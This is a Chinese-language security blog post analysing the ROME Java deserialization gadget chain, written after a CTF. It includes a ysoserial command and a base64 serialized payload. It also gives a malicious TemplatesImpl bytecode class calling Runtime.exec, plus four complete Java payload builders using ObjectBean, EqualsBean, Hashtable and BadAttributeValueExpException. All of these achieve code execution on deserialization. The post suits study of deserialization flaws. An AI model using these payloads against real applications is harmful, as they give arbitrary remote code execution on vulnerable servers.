---
title: "ROME 反序列化分析"
date: 2022-11-08T12:03:16+08:00
lastmod: 2022-11-08T12:03:16+08:00
draft: false
author: "X1r0z"

tags: ['rome']
categories: ['Java 安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

之前打 ctf 遇到的, 顺带写一下吧

<!--more-->

## 环境搭建

> ROME is a Java framework for RSS and Atom feeds. It's open source and licensed under the Apache 2.0 license.
>
> ROME includes a set of parsers and generators for the various flavors of syndication feeds, as well as converters to convert from one format to another. The parsers can give you back Java objects that are either specific for the format you want to work with, or a generic normalized SyndFeed class that lets you work on with the data without bothering about the incoming or outgoing feed type.

在 IDEA 中的依赖界面导入 ROME 包, 版本为 1.0

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081114775.png)

然后关掉 IDEA 的 toString 对象视图, 因为该选项会默认调用实例方法的 toString, 并且会忽略 toString 中设置的断点, 而 ROME 链涉及到 ToStringBean 的 toString 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081118046.png)

通过 ysoserial 生成 payload

```bash
java -jar ysoserial-all.jar ROME "calc.exe" | base64
```

编写 Serialization 类, 方便后续调试

```java
package com.example;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Serialization {

    public static byte[] serialize(Object obj) throws Exception{
        ByteArrayOutputStream arr = new ByteArrayOutputStream();
        try (ObjectOutputStream output = new ObjectOutputStream(arr)){
            output.writeObject(obj);
        }
        return arr.toByteArray();
    }

    public static Object unserialize(byte[] arr) throws Exception{
        Object obj;
        try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(arr))){
            obj = input.readObject();
        }
        return obj;
    }

    public static void test(Object obj) throws Exception{
        byte[] data = serialize(obj);
        unserialize(data);
    }
}
```

编写 Demo

```java
package com.example;

import java.util.Base64;

public class Demo {
    public static void main(String[] args) throws Exception{
        String exp = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDE1ODEyNTYxODAwODAwAQAgTHlzb3NlcmlhbC9Qd25lcjQxNTgxMjU2MTgwMDgwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB+AB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB+ACNxAH4ADXEAfgAGcQB+AAZxAH4ABng=";
        byte[] code = Base64.getDecoder().decode(exp);
        Serialization.unserialize(code);
	}
}
```

运行后成功弹出计算器

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081121902.png)

## 反序列化分析

ysoserial 中的利用链

```
TemplatesImpl.getOutputProperties()
NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
NativeMethodAccessorImpl.invoke(Object, Object[])
DelegatingMethodAccessorImpl.invoke(Object, Object[])
Method.invoke(Object, Object...)
ToStringBean.toString(String)
ToStringBean.toString()
ObjectBean.toString()
EqualsBean.beanHashCode()
ObjectBean.hashCode()
HashMap<K,V>.hash(Object)
HashMap<K,V>.readObject(ObjectInputStream)
```

前面 HashMap 的部分已经很熟悉了 (URLDNS), 这里为了方便调试先在 ObjectBean.hashCode() 处打个断点

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081124212.png)

下面开始调试

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081125271.png)

hashCode 调用了 EqualsBean 的 beanHashCode 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081126272.png)

 beanHashCode 又调用了 ObjectBean 的 toString 方法, 但这两个 ObjectBean 不是同一个

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081127063.png)

然后调用 ToStringBean 的 toString 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081128170.png)

在 toString 内部会获取 `this._obj` 的 Class 对象并获取其名称, 然后设置 prefix 为全类名的最后一位 (即 TemplatesImpl), 并在 return 时调用 `this.toString(prefix)` 这个重载方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081130105.png)

方法内部先通过 `BeanIntrospector.getPropertyDescriptors()` 获取 `this._beanClass` 的 JavaBean, 然后遍历 getter, 判断其是否由 Object 类声明, 并且是否无参, 最后调用这个无参的 getter

再往下就是 TemplatesImpl 的内容了, 很容易想到它的 `_outputProperties` 属性存在 getOutputProperties 这个 getter, 并且在里面调用了 newTransformer 方法, 经过一系列调用最终加载 Java 字节码并执行它的无参构造方法

总的来说利用链还是比较简单的, 就是 ObjectBean EqualsBean ToStringBean 之间的相互调用

## 利用链

ROME 链的构造方式很多, 下面也只是列举了几个比较常用的

这里没有涉及到如何缩短 payload, 等以后 ctf 遇到相关题型再总结吧

### ObjectBean

ysoserial 链用的就是 ObjectBean

先看一下它的定义

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081142672.png)

构造方法实例化了 EqualsBean 和 ToStringBean

然后是 EqualsBean 的构造方法, 里面会检查 obj 是否是 beanClass 的实例, 后面写的时候需要注意一下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081144604.png)

因为前面分析的入口点就是 `ObjectBean.hashCode()`, 而后面调用的 EqualsBean ToStringBean 其实都是 ObjectBean 内部的属性, 所以写 payload 的时候只需要构造 ObjectBean 即可

Hello.java

```java
package com.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Hello extends AbstractTranslet {
    public Hello(){
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

payload

```java
package com.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Demo {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        JavaClass cls = Repository.lookupClass(Hello.class);

        setFieldValue("_name", "Hello", templatesImpl);
        setFieldValue("_bytecodes", new byte[][]{cls.getBytes()}, templatesImpl);

        ObjectBean objectBean1 = new ObjectBean(Templates.class, templatesImpl);
        ObjectBean objectBean2 = new ObjectBean(ObjectBean.class, objectBean1);

        Map map = new HashMap();
        map.put(objectBean2, 123);

        setFieldValue("_tfactory", new TransformerFactoryImpl(), templatesImpl);

        Serialization.test(map);
    }
    public static void setFieldValue(String name, Object value, Object obj) throws Exception{
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
}
```

Templates.class 相比于 TemplatesImpl.class 的好处是前者只有 getOutputProperties 这一个 getter, 如果使用后者的话最终可能无法执行成功

注意 `_tfactory` 要在 put 之后设置, 这样做是为了防止在 put 时提前执行命令, 因为 put 方法会调用 `hash(key)` 即 `key.hashCode()`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081155882.png)

### EqualsBean

回过头再看一下它的定义

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081158562.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081158601.png)

EqualsBean 刚好也存在 hashCode, 并且也能调用 `this._obj` 的 toString

那么这里就可以指定 `this._obj` 为 ToStringBean

ToStringBean 的构造方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081200040.png)

我们指定 `_beanClass` 为 Templates.class, `_obj` 为 TemplatesImpl

最后得到的利用链为

```
TemplatesImpl.getOutputProperties()
NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
NativeMethodAccessorImpl.invoke(Object, Object[])
DelegatingMethodAccessorImpl.invoke(Object, Object[])
Method.invoke(Object, Object...)
ToStringBean.toString(String)
ToStringBean.toString()
EqualsBean.beanHashCode()
EqualsBean.hashCode()
HashMap<K,V>.hash(Object)
HashMap<K,V>.readObject(ObjectInputStream)
```

payload

```java
package com.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Demo {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        JavaClass cls = Repository.lookupClass(Hello.class);

        setFieldValue("_name", "Hello", templatesImpl);
        setFieldValue("_bytecodes", new byte[][]{cls.getBytes()}, templatesImpl);

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        Map map = new HashMap();
        map.put(equalsBean, 123);

        setFieldValue("_tfactory", new TransformerFactoryImpl(), templatesImpl);

        Serialization.test(map);
    }
    public static void setFieldValue(String name, Object value, Object obj) throws Exception{
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081204301.png)

### Hashtable

Hashtable 跟 HashMap 一样也会调用 `key.hashCode()`, 在一些场景下如果过滤了 HashMap, 就可以利用 Hashtable 来绕过

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081208297.png)

跟进 reconstitutionPut

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081208112.png)

剩下利用 ObjectBean 或者 EqualsBean 都行

以 EqualsBean 为例, 得到的利用链为

```
TemplatesImpl.getOutputProperties()
NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
NativeMethodAccessorImpl.invoke(Object, Object[])
DelegatingMethodAccessorImpl.invoke(Object, Object[])
Method.invoke(Object, Object...)
ToStringBean.toString(String)
ToStringBean.toString()
EqualsBean.beanHashCode()
EqualsBean.hashCode()
Hashtable<K,V>.reconstitutionPut(Entry<?,?>[], K, V)
Hashtable<K,V>.readObject(ObjectInputStream)
```

payload

```java
package com.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class Demo {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        JavaClass cls = Repository.lookupClass(Hello.class);

        setFieldValue("_name", "Hello", templatesImpl);
        setFieldValue("_bytecodes", new byte[][]{cls.getBytes()}, templatesImpl);

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        Hashtable ht = new Hashtable();
        ht.put(equalsBean, 123);

        setFieldValue("_tfactory", new TransformerFactoryImpl(), templatesImpl);

        Serialization.test(ht);
    }
    public static void setFieldValue(String name, Object value, Object obj) throws Exception{
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081211819.png)

### BadAttributeValueExpException

BadAttributeValueExpException 曾在 cc 链中出现过, 它的 readObject 方法也会调用 toString

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081215711.png)

valObj 从自身的 val 属性获取, 之后进入 if 判断, 这里的触发条件其实是 `System.getSecurityManager() == null`, 即未开启 Java 安全管理器, 最后调用 valObj.toString()

利用链为

```
TemplatesImpl.getOutputProperties()
NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
NativeMethodAccessorImpl.invoke(Object, Object[])
DelegatingMethodAccessorImpl.invoke(Object, Object[])
Method.invoke(Object, Object...)
ToStringBean.toString(String)
ToStringBean.toString()
BadAttributeValueExpException.readObject(ObjectInputStream)
```

payload

```java
package com.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.*;

public class Demo {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        JavaClass cls = Repository.lookupClass(Hello.class);

        setFieldValue("_name", "Hello", templatesImpl);
        setFieldValue("_bytecodes", new byte[][]{cls.getBytes()}, templatesImpl);
        setFieldValue("_tfactory", new TransformerFactoryImpl(), templatesImpl);

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);

        BadAttributeValueExpException e = new BadAttributeValueExpException(123);
        setFieldValue("val", toStringBean, e);

        Serialization.test(e);
    }
    public static void setFieldValue(String name, Object value, Object obj) throws Exception{
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211081220327.png)